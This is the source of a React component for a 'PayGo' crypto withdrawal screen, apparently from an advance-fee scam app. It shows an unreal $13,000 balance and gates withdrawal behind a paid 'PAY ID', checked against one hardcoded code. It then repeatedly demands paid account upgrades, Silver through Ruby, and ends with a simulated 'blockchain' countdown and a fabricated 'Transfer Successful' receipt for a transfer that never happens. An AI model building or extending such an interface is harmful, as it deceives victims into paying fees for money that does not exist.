import React, { useState, useEffect } from 'react';
import { useAuth } from '../context/AuthContext';
import {
  ArrowLeft,
  CheckCircle2,
  Lock,
  ExternalLink,
  Eye,
  EyeOff,
  Download,
  Share2,
  CreditCard,
  User,
  AlertCircle,
  Bitcoin,
  Crown,
} from 'lucide-react';

interface TransferProps {
  onBack: () => void;
  onNavigateToBuyPayId: () => void;
  onNavigateToUpgrade: () => void;
}

const TRADING_EXCHANGES = ['Binance', 'TrustWallet', 'Bybit', 'KuCoin', 'OKX', 'MetaMask', 'Other Wallet'];

export const Transfer: React.FC<TransferProps> = ({
  onBack,
  onNavigateToBuyPayId,
  onNavigateToUpgrade,
}) => {
  const { user, updateBalance, addTransaction, transactions } = useAuth();

  const [walletUsername, setWalletUsername] = useState('');
  const [exchange, setExchange] = useState('Binance');
  const [walletAddress, setWalletAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [payId, setPayId] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [countdown, setCountdown] = useState(10);
  const [receiptTxnId, setReceiptTxnId] = useState('');
  const [errorMsg, setErrorMsg] = useState('');
  const [upgradePromptMsg, setUpgradePromptMsg] = useState<string | null>(null);

  const REQUIRED_PAY_ID = 'PG-7474PAYDDT1I2P18837DOEFQ';
  const hasPayId =
    Boolean(user?.payIdVerified) || transactions.some((t) => t.type === 'PAY ID Purchase');

  // Processing countdown
  useEffect(() => {
    let timer: any;
    if (isProcessing && countdown > 0) {
      timer = setTimeout(() => {
        setCountdown((prev) => prev - 1);
      }, 1000);
    } else if (isProcessing && countdown === 0) {
      const amt = parseFloat(amount);
      updateBalance(amt);
      addTransaction({
        type: 'Transfer',
        amount: amt,
        recipientName: walletUsername,
        cryptoExchange: exchange,
        walletAddress: walletAddress,
        date: new Date().toLocaleDateString() + ' at ' + new Date().toLocaleTimeString(),
      });
      setIsProcessing(false);
      setIsSuccess(true);
    }
    return () => clearTimeout(timer);
  }, [isProcessing, countdown]);

  const handleStartTransfer = (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg('');

    if (!walletUsername || !walletAddress || !amount || !payId) {
      setErrorMsg('Please fill in all required fields');
      return;
    }

    const transferAmount = parseFloat(amount);
    if (isNaN(transferAmount) || transferAmount <= 0) {
      setErrorMsg('Please enter a valid amount');
      return;
    }

    if (transferAmount < 5000) {
      setErrorMsg('Minimum withdrawal amount is $5,000.00. Please enter $5,000 or more.');
      return;
    }

    if (transferAmount > (user?.balance || 0)) {
      setErrorMsg('Insufficient balance. Please enter an amount within your balance.');
      return;
    }

    // Check if PAY ID has been generated (via gift card or card verification)
    if (!hasPayId) {
      setErrorMsg('You must obtain your PAY ID first before transferring. Tap "Buy PAY ID" on the dashboard.');
      return;
    }

    // Validate pasted PAY ID code first
    if (payId.trim() !== REQUIRED_PAY_ID) {
      setErrorMsg(
        'Invalid PayGo ID. Please paste the exact PAY ID generated from "Buy PAY ID" to continue.'
      );
      return;
    }

    // Account Upgrade Gate: Once PAY ID is pasted, enforce tier progression up to Stage 5 — Ruby for $5,000+ withdrawals
    const currentLevel = user?.accountLevel || 'Basic';
    const hasRubyOrHigher =
      currentLevel.includes('Ruby') ||
      currentLevel.includes('Diamond') ||
      currentLevel.includes('Black');

    if (currentLevel === 'Basic') {
      const msg =
        'Your PAY ID is verified! Since the minimum withdrawal is $5,000, you must upgrade your account (starting from Stage 1 — Silver up to Stage 5 — Ruby) to access your money and make your first withdrawal.';
      setErrorMsg(msg);
      setUpgradePromptMsg(msg);
      return;
    }

    if (currentLevel.includes('Silver')) {
      const msg =
        'Your Stage 1 (Silver) upgrade is confirmed! Please upgrade to the second tier (Stage 2 — Gold) and reach Stage 5 — Ruby Tier to unlock your first $5,000+ withdrawal.';
      setErrorMsg(msg);
      setUpgradePromptMsg(msg);
      return;
    }

    if (!hasRubyOrHigher) {
      const msg = `You are currently on ${currentLevel}. To make your first withdrawal (minimum $5,000), you must upgrade to Stage 5 — Ruby Tier or higher.`;
      setErrorMsg(msg);
      setUpgradePromptMsg(msg);
      return;
    }

    setReceiptTxnId(`TXN${Date.now().toString().slice(-8)}`);
    setCountdown(10);
    setIsProcessing(true);
  };

  const handleDownloadReceipt = () => {
    const receiptContent = `
PAYGO TRANSACTION RECEIPT
--------------------------
Transaction Status: SUCCESSFUL
Reference: ${receiptTxnId}
Amount: $${parseFloat(amount).toLocaleString()}
Wallet/Username: ${walletUsername}
Exchange/Network: ${exchange}
Wallet Address: ${walletAddress}
Date & Time: ${new Date().toLocaleString()}
Processed by: PayGo Financial Services
--------------------------
Keep this receipt for your records.
    `.trim();

    const blob = new Blob([receiptContent], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `paygo_receipt_${receiptTxnId}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const handleShareReceipt = () => {
    const text = encodeURIComponent(
      `PayGo Crypto Withdrawal of $${parseFloat(amount).toLocaleString()} to ${exchange} (${walletUsername}) was successful! Ref: ${receiptTxnId}`
    );
    window.open(`https://wa.me/?text=${text}`, '_blank');
  };

  // Processing screen
  if (isProcessing) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <div className="bg-white rounded-3xl p-8 max-w-sm w-full text-center shadow-xl border border-gray-100 space-y-5">
          <div className="w-20 h-20 border-4 border-purple-600 border-t-transparent rounded-full animate-spin mx-auto" />
          <h3 className="text-2xl font-bold text-gray-900">Processing Crypto</h3>
          <p className="text-sm text-gray-500">
            Connecting to blockchain network and verifying PAY ID...
          </p>
          <div className="text-4xl font-black text-purple-600 font-mono">{countdown}s</div>
          <div className="w-full bg-gray-200 rounded-full h-2 overflow-hidden">
            <div
              className="bg-purple-600 h-full rounded-full transition-all duration-1000"
              style={{ width: `${((10 - countdown) / 10) * 100}%` }}
            />
          </div>
          <p className="text-xs text-gray-400">Please do not close this window</p>
        </div>
      </div>
    );
  }

  // Success Receipt view
  if (isSuccess) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4 sm:p-6">
        <div className="bg-white rounded-3xl shadow-2xl max-w-md w-full overflow-hidden border border-gray-100">
          <div className="bg-gradient-to-r from-emerald-500 to-green-600 text-white p-6 text-center">
            <div className="w-16 h-16 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-3 backdrop-blur-xs">
              <CheckCircle2 className="w-9 h-9 text-white" />
            </div>
            <h2 className="text-2xl font-bold">Transfer Successful</h2>
            <p className="text-emerald-100 text-sm mt-0.5">Your funds have been sent</p>
          </div>

          <div className="p-6 text-center border-b border-gray-100 bg-gray-50/50">
            <p className="text-xs font-semibold uppercase tracking-wider text-gray-500 mb-1">
              Amount Sent
            </p>
            <h1 className="text-3xl sm:text-4xl font-black text-gray-900">
              ${parseFloat(amount).toLocaleString('en-NG', { minimumFractionDigits: 2 })}
            </h1>
          </div>

          <div className="p-6 space-y-4">
            <div className="grid grid-cols-2 gap-4 text-sm">
              <div>
                <p className="text-gray-400 text-xs uppercase font-medium">Wallet Username</p>
                <p className="font-bold text-gray-900">{walletUsername}</p>
              </div>
              <div>
                <p className="text-gray-400 text-xs uppercase font-medium">Exchange</p>
                <p className="font-bold text-gray-900">{exchange}</p>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4 text-sm">
              <div className="col-span-2">
                <p className="text-gray-400 text-xs uppercase font-medium">Wallet Address</p>
                <p className="font-bold font-mono text-gray-900 text-xs break-all">{walletAddress}</p>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4 text-sm pt-1">
              <div>
                <p className="text-gray-400 text-xs uppercase font-medium">Transaction Ref</p>
                <p className="font-bold font-mono text-gray-900">{receiptTxnId}</p>
              </div>
              <div>
                <p className="text-gray-400 text-xs uppercase font-medium">Date & Time</p>
                <p className="font-semibold text-gray-900 text-xs">{new Date().toLocaleString()}</p>
              </div>
            </div>

            <div className="bg-gray-50 rounded-xl p-3 text-center text-xs text-gray-500 border border-gray-100">
              <p>Transaction processed securely by PayGo</p>
              <p className="text-gray-400 text-[11px] mt-0.5">Keep this receipt for your records</p>
            </div>

            <div className="grid grid-cols-2 gap-3 pt-2">
              <button
                onClick={handleDownloadReceipt}
                className="w-full bg-gray-100 hover:bg-gray-200 text-gray-800 font-semibold py-3 px-3 rounded-xl text-xs flex items-center justify-center space-x-1.5 transition-all cursor-pointer"
              >
                <Download className="w-4 h-4" />
                <span>Save Receipt</span>
              </button>
              <button
                onClick={handleShareReceipt}
                className="w-full bg-emerald-50 hover:bg-emerald-100 text-emerald-700 font-semibold py-3 px-3 rounded-xl text-xs flex items-center justify-center space-x-1.5 transition-all border border-emerald-200 cursor-pointer"
              >
                <Share2 className="w-4 h-4" />
                <span>Share</span>
              </button>
            </div>

            <button
              onClick={onBack}
              className="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-3.5 rounded-xl text-sm shadow-md transition-all mt-2 cursor-pointer"
            >
              Done & Return to Dashboard
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 pb-12">
      {/* Top Header */}
      <div className="bg-purple-700 text-white p-4 shadow-md sticky top-0 z-30">
        <div className="max-w-xl mx-auto flex items-center justify-between">
          <div className="flex items-center space-x-3">
            <button
              onClick={onBack}
              className="p-2 hover:bg-white/10 rounded-full transition-colors text-white cursor-pointer"
            >
              <ArrowLeft className="w-5 h-5" />
            </button>
            <div>
              <h1 className="text-lg font-bold">Crypto Withdrawal</h1>
              <p className="text-xs text-purple-200">Instant Crypto / Trading Withdrawal</p>
            </div>
          </div>

          <button
            onClick={onNavigateToBuyPayId}
            className="text-xs bg-amber-400 hover:bg-amber-500 text-purple-950 font-bold px-3 py-1.5 rounded-xl shadow-xs transition-colors flex items-center space-x-1 cursor-pointer"
          >
            <span>Buy PAY ID</span>
          </button>
        </div>
      </div>

      <div className="max-w-xl mx-auto p-4 sm:p-6 space-y-6">
        {/* Available Balance Box */}
        <div className="bg-gradient-to-r from-purple-900 to-indigo-900 text-white rounded-2xl p-5 shadow-sm flex items-center justify-between">
          <div>
            <p className="text-xs uppercase tracking-wider text-purple-200 font-medium">
              Available Balance
            </p>
            <h2 className="text-2xl sm:text-3xl font-black mt-1">
              ${(user?.balance ?? 13000).toLocaleString('en-NG', { minimumFractionDigits: 2 })}
            </h2>
          </div>
          <div className="text-right">
            <span className="text-[11px] bg-emerald-500/20 text-emerald-300 font-semibold px-2.5 py-1 rounded-full border border-emerald-400/30">
              Ready to Withdraw
            </span>
          </div>
        </div>

        {errorMsg && (
          <div className="p-4 bg-red-50 border border-red-200 rounded-xl text-red-700 text-xs flex items-start space-x-2">
            <AlertCircle className="w-4 h-4 shrink-0 mt-0.5 text-red-500" />
            <div className="space-y-2">
              <p className="font-semibold">{errorMsg}</p>
              {errorMsg.includes('upgrade your account') || errorMsg.includes('Ruby Tier') ? (
                <button
                  type="button"
                  onClick={onNavigateToUpgrade}
                  className="bg-purple-600 hover:bg-purple-700 text-white px-3.5 py-2 rounded-lg text-xs font-bold inline-flex items-center space-x-1.5 shadow-xs cursor-pointer"
                >
                  <Crown className="w-3.5 h-3.5 text-amber-300" />
                  <span>Upgrade Account Now</span>
                </button>
              ) : !hasPayId ? (
                <button
                  type="button"
                  onClick={onNavigateToBuyPayId}
                  className="text-purple-700 font-bold underline text-xs cursor-pointer"
                >
                  Go to Buy PAY ID
                </button>
              ) : null}
            </div>
          </div>
        )}

        <div className="bg-white rounded-2xl p-6 shadow-sm border border-gray-100">
          <h2 className="text-lg font-bold text-gray-900 mb-5">Withdrawal Details</h2>

          <form onSubmit={handleStartTransfer} className="space-y-4">
            <div>
              <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1.5">
                Wallet / Account Username
              </label>
              <div className="relative">
                <User className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400" />
                <input
                  type="text"
                  value={walletUsername}
                  onChange={(e) => setWalletUsername(e.target.value)}
                  placeholder="Enter your exchange username"
                  className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm text-gray-900"
                  required
                />
              </div>
            </div>

            <div>
              <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1.5">
                Exchange / Network
              </label>
              <div className="relative">
                <Bitcoin className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none" />
                <select
                  value={exchange}
                  onChange={(e) => setExchange(e.target.value)}
                  className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm text-gray-900 bg-white"
                >
                  {TRADING_EXCHANGES.map((b) => (
                    <option key={b} value={b}>
                      {b}
                    </option>
                  ))}
                </select>
              </div>
            </div>

            <div>
              <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1.5">
                Wallet Address
              </label>
              <div className="relative">
                <CreditCard className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400" />
                <input
                  type="text"
                  value={walletAddress}
                  onChange={(e) => setWalletAddress(e.target.value)}
                  placeholder="Enter deposit wallet address"
                  className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-mono text-gray-900"
                  required
                />
              </div>
            </div>

            <div>
              <div className="flex items-center justify-between mb-1.5">
                <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600">
                  Amount ($)
                </label>
                <span className="text-[11px] font-semibold text-purple-700">
                  Min: $5,000 (Ruby Tier Required)
                </span>
              </div>
              <div className="relative">
                <span className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-500 font-bold text-sm">
                  $
                </span>
                <input
                  type="number"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="Min 5000 (e.g. 13000)"
                  min={5000}
                  max={user?.balance ?? 13000}
                  className="w-full pl-8 pr-16 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-bold text-gray-900"
                  required
                />
                <button
                  type="button"
                  onClick={() => setAmount(String(user?.balance ?? 13000))}
                  className="absolute right-2.5 top-1/2 -translate-y-1/2 text-xs bg-purple-100 text-purple-700 hover:bg-purple-200 px-2 py-1 rounded-lg font-semibold cursor-pointer"
                >
                  MAX
                </button>
              </div>
            </div>

            {/* PayGo ID field with Buy Code helper */}
            <div>
              <div className="flex items-center justify-between mb-1.5">
                <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600">
                  PayGo ID Code
                </label>
                <button
                  type="button"
                  onClick={onNavigateToBuyPayId}
                  className="text-xs text-purple-600 font-semibold hover:underline flex items-center space-x-1 cursor-pointer"
                >
                  <span>Buy PAY ID code</span>
                  <ExternalLink className="w-3 h-3" />
                </button>
              </div>

              <div className="relative">
                <Lock className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400" />
                <input
                  type="text"
                  value={payId}
                  onChange={(e) => setPayId(e.target.value)}
                  placeholder="Paste your generated PAY ID code"
                  className="w-full pl-10 pr-24 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-xs font-mono text-gray-900"
                  required
                />
                {hasPayId && (
                  <button
                    type="button"
                    onClick={() => setPayId(REQUIRED_PAY_ID)}
                    className="absolute right-2 top-1/2 -translate-y-1/2 text-[11px] bg-purple-50 text-purple-700 hover:bg-purple-100 px-2 py-1 rounded-lg font-semibold border border-purple-200 cursor-pointer"
                  >
                    Paste PAY ID
                  </button>
                )}
              </div>
              <p className="text-[11px] text-gray-400 mt-1">
                A valid PAY ID is required to authorize crypto/trading withdrawals.
              </p>
            </div>

            <button
              type="submit"
              className="w-full mt-4 bg-purple-600 hover:bg-purple-700 text-white font-bold py-4 rounded-xl text-base shadow-md transition-all cursor-pointer flex items-center justify-center space-x-2"
            >
              <span>Confirm & Withdraw Crypto</span>
            </button>
          </form>
        </div>
      </div>

      {/* Account Upgrade Required Modal */}
      {upgradePromptMsg && (
        <div className="fixed inset-0 bg-black/65 backdrop-blur-xs flex items-center justify-center p-4 z-50 animate-in fade-in">
          <div className="bg-white rounded-3xl p-6 max-w-sm w-full shadow-2xl border border-purple-100 text-center space-y-4">
            <div className="w-16 h-16 bg-amber-100 text-amber-600 rounded-full flex items-center justify-center mx-auto ring-8 ring-amber-50">
              <Crown className="w-8 h-8 fill-amber-500" />
            </div>

            <div>
              <span className="inline-block text-[10px] font-bold uppercase tracking-wider bg-emerald-100 text-emerald-700 px-2.5 py-1 rounded-full mb-2">
                PAY ID Verified
              </span>
              <h3 className="text-xl font-extrabold text-gray-900">
                Upgrade Required to Access Your Money
              </h3>
              <p className="text-xs text-gray-600 mt-2 leading-relaxed">
                {upgradePromptMsg}
              </p>
            </div>

            <div className="space-y-2.5 pt-1">
              <button
                type="button"
                onClick={() => {
                  setUpgradePromptMsg(null);
                  onNavigateToUpgrade();
                }}
                className="w-full min-h-[48px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-3.5 rounded-xl text-sm shadow-md transition-all cursor-pointer flex items-center justify-center space-x-2"
              >
                <Crown className="w-4 h-4 text-amber-300" />
                <span>Upgrade Account Now</span>
              </button>
              <button
                type="button"
                onClick={() => setUpgradePromptMsg(null)}
                className="w-full min-h-[44px] bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold py-2.5 rounded-xl text-xs transition-colors cursor-pointer"
              >
                Maybe Later
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
